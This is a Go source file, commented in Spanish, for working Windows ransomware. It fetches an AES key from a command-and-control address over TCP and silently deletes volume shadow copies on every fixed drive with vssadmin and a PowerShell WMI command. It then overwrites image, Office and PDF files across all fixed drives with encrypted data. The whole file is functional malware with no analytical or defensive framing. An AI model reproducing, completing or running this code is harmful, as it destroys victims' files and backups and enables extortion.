package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	c2Addr = "127.0.0.1:4444" // IP del servidor C2
)

var targetExts = map[string]bool{
	".jpg":  true,
	".jpeg": true,
	".png":  true,
	".gif":  true,
	".docx": true,
	".xlsx": true,
	".pptx": true,
	".pdf":  true,
}

func main() {
	// Paso 0: Obtener clave AES desde C2 mediante conexión reversa
	key := fetchKeyFromC2()
	if key == nil {
		fmt.Println("No se pudo obtener la clave del C2")
		os.Exit(1)
	}

	// Paso 1: Borrar shadows en TODAS las unidades detectadas
	silentlyWipeShadowsAllVolumes()

	// Paso 2: Detectar todas las unidades fijas y cifrar en ellas
	volumes := getFixedVolumes()

	var totalCount int
	fmt.Println("Archivos cifrados (todas las unidades):")

	for _, vol := range volumes {
		count := 0
		_ = filepath.Walk(vol, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return filepath.SkipDir
			}
			if info.IsDir() {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(path))
			if !targetExts[ext] {
				return nil
			}

			fmt.Printf("%s\n", path)

			if encryptFile(path, key) == nil {
				count++
				totalCount++
			}

			return nil
		})
	}

	fmt.Printf("\nTotal archivos cifrados en todas las unidades: %d\n", totalCount)

	// Notificación global al finalizar
	notifyGlobalChange()

	os.Exit(0)
}

// Obtiene todas las unidades fijas del sistema (C:, D:, E:, etc.)
func getFixedVolumes() []string {
	var volumes []string
	// Recorro todos los posibles discos
	for drive := 'A'; drive <= 'Z'; drive++ {
		vol := string(drive) + `:\`

		// Comprobamos si la unidad existe
		if _, err := os.Stat(vol); err == nil {
			// Convertimos a UTF-16 la dirección
			volUTF16, err := syscall.UTF16PtrFromString(vol)
			if err != nil {
				continue
			}

			driveType := windows.GetDriveType(volUTF16)

			// DRIVE_FIXED = 3 → unidades internas (disco duro, SSD, etc.)
			if driveType == windows.DRIVE_FIXED {
				volumes = append(volumes, vol)
			}
		}
	}

	return volumes
}

// Borrar shadows en TODAS las unidades detectadas
func silentlyWipeShadowsAllVolumes() {
	devNull, _ := os.OpenFile(os.DevNull, os.O_WRONLY, 0644)
	defer devNull.Close()

	volumes := getFixedVolumes()

	for _, vol := range volumes {
		letter := vol[:1] // "C", "D", etc.

		cmd := exec.Command("vssadmin", "delete", "shadows", "/for="+letter+":", "/all", "/quiet")
		cmd.Stdout = devNull
		cmd.Stderr = devNull
		_ = cmd.Run()
	}

	// WMI global como respaldo
	ps := `Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | ForEach-Object { $_.Delete() | Out-Null } 2>$null`
	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps)
	cmd.Stdout = devNull
	cmd.Stderr = devNull
	_ = cmd.Run()
}

// Conexión reversa al C2 para obtener la clave AES
func fetchKeyFromC2() []byte {
	var conn net.Conn
	var err error

	for i := 0; i < 3; i++ {
		conn, err = net.DialTimeout("tcp", c2Addr, 5*time.Second)
		if err == nil {
			break
		}
		time.Sleep(3 * time.Second)
	}

	if err != nil {
		fmt.Println("No se pudo conectar al C2:", err)
		return nil
	}
	defer conn.Close()

	buf := make([]byte, 65)
	n, err := conn.Read(buf)
	if err != nil || n < 64 {
		fmt.Println("Error leyendo clave del C2:", err)
		return nil
	}

	keyHex := strings.TrimSpace(string(buf[:64]))
	keyBytes, err := hex.DecodeString(keyHex)
	if err != nil || len(keyBytes) != 32 {
		fmt.Println("Clave inválida recibida del C2")
		return nil
	}

	fmt.Println("Clave obtenida correctamente del C2")
	return keyBytes
}

func encryptFile(path string, key []byte) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return err
	}

	ciphertext := gcm.Seal(nil, nonce, data, nil)
	output := append(nonce, ciphertext...)

	err = os.WriteFile(path, output, 0644)
	if err == nil {
		notifyFileChange(path)
	}
	return err
}

func notifyFileChange(path string) {
	const (
		SHCNE_UPDATEITEM = 0x00002000
		SHCNF_PATHW      = 0x0005
	)

	pathUTF16, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}

	shell32 := syscall.MustLoadDLL("shell32.dll")
	proc := shell32.MustFindProc("SHChangeNotify")

	proc.Call(
		uintptr(SHCNE_UPDATEITEM),
		uintptr(SHCNF_PATHW),
		uintptr(unsafe.Pointer(pathUTF16)),
		0,
	)
}

func notifyGlobalChange() {
	const (
		SHCNE_ASSOCCHANGED = 0x08000000
		SHCNF_IDLIST       = 0x0000
	)

	shell32 := syscall.MustLoadDLL("shell32.dll")
	proc := shell32.MustFindProc("SHChangeNotify")

	proc.Call(
		uintptr(SHCNE_ASSOCCHANGED),
		uintptr(SHCNF_IDLIST),
		0,
		0,
	)
}
